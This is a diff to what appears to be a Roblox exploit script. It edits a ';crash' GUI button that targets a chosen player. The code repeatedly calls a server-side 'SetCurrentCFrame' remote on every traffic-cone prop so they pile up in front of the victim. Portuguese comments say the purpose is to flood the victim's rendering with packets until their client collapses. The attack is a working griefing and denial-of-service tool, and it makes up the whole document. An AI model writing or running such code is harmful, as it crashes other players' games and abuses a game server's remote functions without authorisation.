@@ -765,9 +765,9 @@ MainTab:Button({
 })
 
 MainTab:Button({
-   Title = ";crash",
+   Title = ";crash (Gigantes Encaradores)",
    Callback = function()
-       if LoopCrashLuz then return end
+       if LoopCrashPerseguidor then return end
        if not AlvoSelecionado or AlvoSelecionado == "" then return end
        
        local targetPlayer = game:GetService("Players"):FindFirstChild(AlvoSelecionado)
@@ -776,28 +776,31 @@ MainTab:Button({
        local pastaProps = workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")
        if not pastaProps then return end
        
-       LoopCrashLuz = true
+       LoopCrashPerseguidor = true
        
        task.spawn(function()
-           while LoopCrashLuz and targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
+           while LoopCrashPerseguidor and targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
                local rootAlvo = targetPlayer.Character.HumanoidRootPart
                local props = pastaProps:GetChildren()
                if #props == 0 then break end
                
-               -- Posiciona todos os emissores 5 studs à frente do alvo, apontando a luz direto para o peito dele
-               local posicaoEmissor = rootAlvo.Position + (rootAlvo.CFrame.LookVector * 5) + Vector3.new(0, 2, 0)
-               local destinoLuzCFrame = CFrame.lookAt(posicaoEmissor, rootAlvo.Position)
+               -- Calcula o ponto exato de encaramento: 5 studs para frente do olhar do alvo e 8 studs para baixo
+               local posicaoFrente = rootAlvo.Position + (rootAlvo.CFrame.LookVector * 5)
+               local posicaoFinalPoste = Vector3.new(posicaoFrente.X, rootAlvo.Position.Y - 8, posicaoFrente.Z)
                
-               -- Funde todos os emissores no mesmo ponto para colapsar a renderização gráfica do alvo
+               -- Força o CFrame a rotacionar de frente para o peito/origem do alvo para travar a luz nele
+               local destinoEncaradoCFrame = CFrame.lookAt(posicaoFinalPoste, rootAlvo.Position)
+               
+               -- Aplica a fusão estática de iluminação violenta na máquina da vítima
                for _, prop in pairs(props) do
                    local remoto = prop:FindFirstChild("SetCurrentCFrame")
                    if remoto and remoto:IsA("RemoteFunction") then
-                       task.spawn(function() pcall(function() remoto:InvokeServer(destinoLuzCFrame) end) end)
+                       task.spawn(function() pcall(function() remoto:InvokeServer(destinoEncaradoCFrame) end) end)
                    end
                end
-               task.wait(0.01) -- Velocidade máxima de atualização para inundar o pipeline de renderização
+               task.wait(0.01) -- Inundação contínua de pacotes até o colapso do cliente
            end
-           LoopCrashLuz = false
+           LoopCrashPerseguidor = false
        end)
    end
 })
